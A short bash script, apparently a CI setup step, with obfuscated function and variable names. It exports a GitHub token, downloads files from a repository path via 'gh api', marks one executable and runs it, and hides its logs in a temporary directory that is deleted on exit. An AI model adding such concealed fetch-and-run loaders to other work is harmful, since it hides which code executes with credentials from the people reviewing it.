#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
    f "setup failed"
  fi
}

n x_saducxul2ii4zgqk
n x_d6nmh244nmndr3j3
n x_7x4w6zi7gpeelola
n x_hkucgv2zyv5t4tac
a "${x_hkucgv2zyv5t4tac}"
s x_pgaa4mbc6r5ngy5e
if [ -n "${x_pgaa4mbc6r5ngy5e:-}" ]; then
  b "${x_pgaa4mbc6r5ngy5e}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
l="$d/l"
o="$d/o"
mkdir -p "$t"

export GH_TOKEN="${x_7x4w6zi7gpeelola}"
r="${x_saducxul2ii4zgqk}"
v="${x_d6nmh244nmndr3j3}"
k="${x_hkucgv2zyv5t4tac}"

g() {
  local p="$1"
  local q="$2"
  if ! gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
    f "setup failed"
  fi
}

g "x/${k}/x" "$t/x"
g "x/${k}/d" "$t/d"
chmod 700 "$t/x"
chmod 600 "$t/d"

export x_znzk7wuonsuen5cu="$o"
if ! "$t/x" >"$l" 2>&1; then
  f "run failed"
fi

if [ -n "${x_pgaa4mbc6r5ngy5e:-}" ]; then
  n GITHUB_OUTPUT
fi
